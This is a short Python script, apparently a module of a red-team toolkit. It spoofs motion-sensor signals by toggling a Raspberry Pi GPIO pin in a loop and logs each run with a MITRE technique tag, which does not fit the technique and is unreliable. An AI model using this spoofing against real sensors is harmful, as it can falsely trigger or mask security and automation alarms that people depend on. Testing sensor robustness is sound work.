#!/usr/bin/env python3
# modules/attacks/motion_sensor_loop_faker.py

import time
import argparse
import os
import json
from datetime import datetime

LOG_FILE = "results/motion_sensor_loop_log.json"
MITRE_TTP = "T1204.002"

def log_action(sensor_id, duration, mode):
    os.makedirs("results", exist_ok=True)
    entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "sensor_id": sensor_id,
        "duration_sec": duration,
        "mode": mode,
        "ttp": MITRE_TTP
    }
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")

def replay_loop(sensor_gpio, duration):
    try:
        import RPi.GPIO as GPIO
        GPIO.setmode(GPIO.BCM)
        GPIO.setup(sensor_gpio, GPIO.OUT)

        print(f"[✓] Spoofing motion on GPIO {sensor_gpio} for {duration}s")
        start = time.time()
        while time.time() - start < duration:
            GPIO.output(sensor_gpio, GPIO.HIGH)
            time.sleep(0.5)
            GPIO.output(sensor_gpio, GPIO.LOW)
            time.sleep(0.5)
        GPIO.cleanup()
        log_action(f"GPIO{sensor_gpio}", duration, "loop_fake")
    except Exception as e:
        print(f"[!] GPIO error: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Spoof motion sensor patterns using GPIO or IR blaster")
    parser.add_argument("--gpio", type=int, required=True, help="GPIO pin connected to sensor line")
    parser.add_argument("--duration", type=int, default=10, help="Loop duration in seconds")

    args = parser.parse_args()
    replay_loop(args.gpio, args.duration)
